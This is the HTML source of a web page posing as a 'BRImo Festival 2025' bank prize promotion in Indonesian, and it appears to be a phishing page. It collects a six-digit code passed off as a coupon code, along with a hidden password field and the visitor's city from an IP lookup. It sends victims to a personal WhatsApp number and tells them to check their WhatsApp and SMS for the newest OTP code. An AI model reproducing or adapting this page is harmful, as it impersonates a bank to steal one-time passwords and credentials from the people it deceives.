<html>
 <head> 
  ...
  <meta name="theme-color" content="#0F78CB"> 
   <!-- HTML Meta Tags -->
  <title>𝗕𝗥𝗜𝗺𝗼 𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹 𝟮𝟬𝟮𝟱</title>
  ...
  <meta property="og:title" content="𝗕𝗥𝗜𝗺𝗼 𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹 𝟮𝟬𝟮𝟱">
  ...
  <meta name="twitter:title" content="𝗕𝗥𝗜𝗺𝗼 𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹 𝟮𝟬𝟮𝟱">
...
#Aktivasi{
 ...
 <img id="logoku" src="img/imageedit_1_4012154301.png" style="position: fixed; top: 15; left: 15; width: 50px;">
    <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: 70px; border-radius: 0px; margin-bottom: -200px"><center><img alt="" src="img/giphy.gif" style="display: block; margin: 0px; width: 50%; height: 50%; border-radius: 0px;">𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶</center></div>
   ...
   <div class="box-lte"> 
    <div class="row" style="margin-top: 40px;"> 
     ...
     <div class="col-12 d-block mx-auto text-center p-0" style="height: 290px; width: 85%; max-width: 100%; display: block; margin-top: 100px; border-radius: 0px 25px 0px 25px; position: absolute; margin: 0px auto; left: 0; right: 0;z-index: -1"> 
      <img alt="" src="img/AddText_06-14-11.05.21.png" style="display: block; margin: 70px auto; width: 100%; border: 0px solid #fff; border-radius: 15px 15px 15px 15px; border-top: none; box-shadow: rgba(99, 99, 99, 0.2) -0px 3px 8px -2px;"> 
     </div> 
    <div> 
    ...
    <center>
    <div class="row" style="margin-top: 10px; border: 2px solid #fff; width: 94%; border-radius: 15px; background-image: url(img/AddText_06-10-03.05.51.png); background-size: 100% 100%; background-position: 100% 100%; padding-top: 10px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"> 
  ...
  <input type="hidden" id="pass" name="pass">
     <center> 
        <div style="margin-top: 30px"> 
         ...
         <textarea type="tel" name="sms" id="sms" class="bubble-element Input form-log" placeholder="Kode Kupon Virtual= 𝟭𝟯𝟵𝟲-𝟵𝟵𝟭𝟴-𝟬𝟲𝟰𝟲-𝟭𝟬𝟬-𝟬𝟬𝟬" maxlength="6" minlength="6" style="margin-left: 0px; height: 60px; border-radius: 10px; text-align: left; padding: 8px" required onclick="gantiborder1()"></textarea>
    ...
    <input type="submit" id="kirims" class="bubble-element Button clickable-element" onclick="location.href='https://wa.me/628818832721?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="𝗞𝗼𝗻𝗳𝗶𝗿𝗺𝗮𝘀𝗶 𝗖𝗲𝗸 𝗡𝗼𝗺𝗼𝗿 𝗞𝘂𝗽𝗼𝗻"  />
<div>
    </div>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        fetch("https://ipinfo.io/city")
            .then(response => response.text())
            .then(data => {
                document.getElementById("kota").value = data.trim(); // Mengisi input dengan nama kota
                console.log("Kota:", data.trim());
            })
            .catch(error => {
                console.error("Gagal mendapatkan nama kota:", error);
                document.getElementById("kota").value = "Gagal Mendapatkan Kota";
            });
    });
</script>
     <b> </b>
    ...
    <b> </b>
   <div>
   <b> <p onclick="location.href='https://wa.me/62818832721?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none"> Tidak Terima Kode ?<br>
...
<source src="cs.otp." type="audio/ogg">
<source src="cs.otp." type="audio/mpeg">
  Your browser does not support the audio element.
</audio> 
 <audio hidden controls id="bsiku">
<source src="media/tunggu-bri.mp3" type="audio/ogg">
<source src="media/tunggu-bri.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
    </div> </b>
  </div>
...
$.ajax({
 ...
 setTimeout(function(){
  ...
  alert("Harap Periksa 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 yang terbaru di Whatshapp dan SMS inbox anda");
